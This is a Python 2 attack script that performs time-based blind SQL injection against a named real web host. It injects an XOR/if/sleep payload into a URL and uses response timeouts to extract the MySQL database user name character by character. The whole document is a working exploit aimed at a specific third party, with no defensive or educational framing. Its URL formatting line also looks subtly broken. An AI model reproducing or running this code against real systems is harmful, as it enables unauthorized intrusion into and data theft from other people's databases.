#!/usr/bin/env python
#encoding=utf-8
import httplib
import time
import string
import sys
import random
import urllib

headers = {}
payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.'
print '[%s] Start to retrive MySQL User:' % time.strftime('%H:%M:%S', time.localtime())

user = ''

for i in range(1, 25):
    for payload in payloads:
        try:
            s = "ascii(mid(lower(user()),%s,1))=%s" % (i, ord(payload))
            s = "aaa'XOR(if(%s,sleep(3),0))OR'bbb" % s
            conn = httplib.HTTPConnection('hk5.midea.com', timeout=3)
            conn.request(method='GET',url="/~midea/midea_special/monthly_special/product/*" % urllib.quote(s))
            conn.getresponse().read()
            conn.close()
            print '.',
        except:
            user += payload
            print '\n[in progress]', user,
            time.sleep(3.0)
            break
print '\n[Done] MySQL user is %s' % user
